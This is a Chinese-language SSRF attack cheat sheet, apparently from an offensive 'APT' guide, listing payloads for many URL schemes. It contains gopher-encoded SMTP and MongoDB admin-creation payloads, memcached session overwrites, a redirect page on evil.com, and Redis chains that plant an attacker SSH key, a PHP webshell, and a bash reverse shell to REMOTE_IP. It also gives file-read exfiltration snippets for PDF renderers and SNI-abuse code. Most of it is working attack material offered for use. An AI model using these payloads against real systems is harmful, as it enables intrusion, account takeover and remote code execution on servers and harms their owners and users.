# SSRF

PHP函数：

+ file_get_contents

+ fsockopen

+ curl_exec

+ fopen

+ mdf_file

## 协议

(1)HTTP/HTTPS

```html
ssrf.php?page=http://127.0.0.1:80
ssrf.php?page=http://127.0.0.1:8080
ssrf.php?page=https://127.0.0.1
```

(2)File

```html
ssrf.php?page=file:///etc/passwd
ssrf.php?page=file://\/\/etc/passwd
```

(3)Dict

```html
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?page=dict://服务器地址:11111/
```

(4)文件传输协议

```html
ftp://user:password@目标站点/  //FTP协议
tftp://目标站点/../file.txt //TFTP协议
sftp://目标站点:11111/  //SFTP协议
```

(5)LDAP

```html
ssrf.php?page=ldap://localhost:11211/%0astats%0aquit
```

(6)SMB

```html
ssrf.php?page=smb://server/share
```

(7)Redis/Memcached

Redis
```html
/proxy?url=redis://Redis服务器地址:6379/set%20mykey%20myvalue
```

Memcached
```html
/proxy?url=memcached://Memcached服务器地址:11211/stats
```

```html
/proxy?url=memcached://Memcached服务器地址:11211/set%20session_user_id%200%20200%2010
//用值0覆盖Memcached中应用程序的会话密钥（session_user_id）
/proxy?url=memcached://Memcached服务器地址:11211/get%20session_user_id
//获取密钥session_user_id的值，用于验证先前的设置命令是否成功
```

(8)Gopher

格式
```html
gopher://host:port/selector
```

与SMTP通信发送电子邮件
```html
GET /ssrf?url=gopher://内部SMTP服务器地址:25/_MAIL%20FROM%3A%3Csnowwolf%40test.com%3E%0D%0ARCP%54%20TO%3A%3Cuser%40example.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0AThis%20is%20an%20email%20sent%20via%20SSRF%20exploit.%0D%0A.%0D%0AQUIT%0D%0A HTTP/1.1
```

SMTP页面
```html
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@ghostwolflab.com>',
                'RCPT To: <admin@test.com>',
                'DATA',
                'Subject: @security!',
                'Hello, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

创建MongoDB用户
```html
gopher://内部MongoDB服务器地址:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00%00%00administrator%00%00%00%00
```

HTTP
```html
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```

回连1337端口
```html
创建evil.com/redirect.php页面
<?php
header("Location: gopher://攻击者主机:1337/_SSRF%0ATest!");
?>

访问地址
https://目标WEB应用程序/?q=http://evil.com/redirect.php
```


(9)Netdoc

```html
ssrf.php?url=netdoc:///etc/passwd
```

## 利用

(1)WSGI

易受攻击的WSGI应用程序
```html
def application(environ, start_response):
//环境变量包含SSRF攻击期间服务器传递的信息
    url = environ.get('HTTP_X_TARGET_URL')
    if url and url.startswith("http"):
    //验证不足，还应该考虑其它请求协议和内部资源的访问
        content = urlopen(url).read()
        //如果url来自不受信任的来源，则可能出现SSRF漏洞
```

payload
```html
gopher://WSGI服务器地址:8000/_%00%1A%00%00%0A%00WSGI_FILE%0C%00/tmp/test.py
```

脚本

[WSGI](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/SSRF/WSGI.py)

| 标头      |           |             |
|-----------|-----------|-------------|
| modifier1 | (1 byte)  | 0 (%00)     |
| datasize  | (2 bytes) | 26 (%1A%00) |
| modifier2 | (1 byte)  | 0 (%00)     |

| 变量     (UWSGI_FILE) |           |    |            |   |
|-----------------------|-----------|----|------------|---|
| key length            | (2 bytes) | 10 | (%0A%00)   |   |
| key data              | (m bytes) |    | UWSGI_FILE |   |
| value length          | (2 bytes) | 12 | (%0C%00)   |   |
| value data            | (n bytes) |    | /tmp/test.py   |   |


(2)Redis

SSH覆盖执行系统命令
```html
/proxy?url=redis://Redis服务器地址:6379/config%20set%20dir%20/var/lib/redis/.ssh/
# 将Redis保存数据的目录更改为Redeis进程运行时的用户目录.ssh
/proxy?url=redis:// Redis服务器地址:6379/config%20set%20dbfilename%20authorized_keys
# 将数据库文件名更改为authorized_keys，这是SSH服务器再确定SSH访问的授权公钥时查找的文件
/proxy?url=redis:// Redis服务器地址:6379/set%20mykey%20%22ssh-rsa%20AAAAB3Nza...user@attacker.com%22
# 将mykey密钥的值设置为攻击者的公共SSH密钥
/proxy?url=redis://Redis服务器地址:6379/save
# 指示Redis保存数据，这回将攻击者的公钥写入.ssh/authorized_keys文件，接下来便可以通过SSH连接Redis的服务器并执行系统命令
```

获取一个webshell
```html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
url=dict://127.0.0.1:6379/SAVE
```

获取一个PHP回连的webshell
```html
url=gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
url=gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
url=gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
url=gopher://127.0.0.1:6379/_save
```

(3)PDF

源文件
```pdf
%PDF-1.5
1 0 obj
<<
  /Type /XObject
  /Subtype /Image
  /Width 500
  /Height 500
  /Filter /DCTDecode
  /ColorSpace /DeviceRGB
  /Length 12345
  /F (http://攻击者主机地址/)
>>
stream
...二进制PDF文件数据...
endstream
endobj
```

```html
<link rel=attachment href="file:///root/secret.txt">
```

```html
<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
```

(4)SNI

SNI利用OpenSSL
```python
from OpenSSL import SSL
import socket

//建立TCP连接
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('外部允许的服务器地址', 443))

//创建SSL上下文
ctx = SSL.Context(SSL.SSLv23_METHOD)  //使用适当方法
ssl_sock = SSL.Connection(ctx, sock)

//设置SNI为内部目标地址
ssl_sock.set_tlsext_host_name(b'内部目标地址')

执行TLS握手
ssl_sock.do_handshake()

//通过SSL连接发送HTTP请求
ssl_sock.sendall(b"GET / HTTP/1.1\r\nHost: 外部允许的服务器地址\r\n\r\n")

//读取响应
response = ssl_sock.recv(4096)
print(response)

//取消连接
ssl_sock.shutdown()
ssl_sock.close()
```

命令
```bash
openssl s_client -connect 目标地址:443 -servername "内部目标地址" -crlf
```
